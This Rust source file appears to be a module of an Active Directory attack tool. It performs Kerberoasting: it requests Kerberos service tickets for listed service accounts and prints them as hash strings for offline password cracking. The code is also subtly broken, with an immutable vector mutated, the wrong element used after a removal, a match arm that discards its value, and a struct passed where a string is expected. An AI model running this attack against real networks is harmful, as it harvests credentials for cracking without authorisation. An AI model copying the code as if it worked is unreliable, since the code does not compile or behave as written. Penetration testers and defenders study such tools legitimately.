use crate::communication::KrbChannel;
use crate::core::CredFormat;
use crate::core::KrbUser;
use crate::core::Vault;
use crate::core::{get_user_tgt, request_tgs};
use crate::core::{tgs_to_crack_string, CrackFormat, S4u2options};
use crate::error::Result;
use crate::utils;
use kerberos_crypto::Key;
use log::info;

struct KerberoastService {
    user: KrbUser,
    service: Option<String>,
}

impl KerberoastService {
    fn new(user: KrbUser, service: Option<String>) -> Self {
        return Self { user, service };
    }
}

const SEPARATOR: &'static str = ":";

fn parse_kerberoast_service(
    line: &str,
    default_realm: &str,
) -> Result<KerberoastService> {
    let parts: Vec<&str> = line.split(SEPARATOR).collect();

    let user_str = parts.remove(0);

    if user_str.is_empty() {
        return Err(format!("No user"));
    }

    let user_parts = parts[0].split(|c| ['/', '\\'].contains(&c)).collect();

    let user = match user_parts.len() {
        1 => KrbUser::new(user_parts[0], default_realm.to_string()),
        2 => {
            if user_parts[0].is_empty() {
                return Err(format!("Empty domain"));
            }

            if user_parts[1].is_empty() {
                return Err(format!("Empty user"));
            }
            KrbUser::new(user_parts[1], user_parts[0]);
        }
        _ => {
            return Err(format!(
                "Invalid user '{}', it must be <domain>/<username>",
                parts[0]
            ))
        }
    };

    if parts.is_empty() {
        return Ok(KerberoastService::new(user, None));
    }

    let service_str = parts.join(SEPARATOR);

    return Ok(KerberoastService::new(user, Some(service_str)));
}

fn parse_kerberoast_file(
    filename: &str,
    default_realm: &str,
) -> Result<Vec<KerberoastService>> {
    let fr = utils::new_lines_reader(&filename)?;

    let mut services = Vec::new();
    for line in fr.lines() {
        let serv =
            parse_kerberoast_service(&line, default_realm).map_err(|e| {
                format!("Invalid line '{}' of '{}': {}", line, &filename, e)
            })?;
        services.push(serv);
    }

    return Ok(services);
}

pub fn kerberoast(
    user: KrbUser,
    user_services_file: String,
    in_vault: &mut dyn Vault,
    out_vault: Option<&dyn Vault>,
    user_key: Option<&Key>,
    channel: &dyn KrbChannel,
    cred_format: CredFormat,
    crack_format: CrackFormat,
    etype: Option<i32>,
) -> Result<()> {
    let services = parse_kerberoast_file(&user_services_file, &user.realm)?;

    let username = user.name.clone();
    let tgt = get_user_tgt(user.clone(), user_key, etype, in_vault, channel)?;

    let mut tickets = in_vault.dump()?;

    for service in services {
        match request_tgs(
            user.clone(),
            user.realm.clone(),
            tgt.clone(),
            S4u2options::Normal(service.clone()),
            etype.map(|e| vec![e]),
            channel,
        ) {
            Err(err) => match &err {
                _ => return Err(err),
            },
            Ok(tgs) => {
                let crack_str = tgs_to_crack_string(
                    &username,
                    &service,
                    &tgs.ticket,
                    crack_format,
                );
                println!("{}", crack_str);
                tickets.push(tgs);
            }
        }
    }

    if let Some(out_vault) = out_vault {
        info!("Save {} TGSs in {}", username, out_vault.id());
        out_vault.save_as(tickets, cred_format)?;
    }
    return Ok(());
}
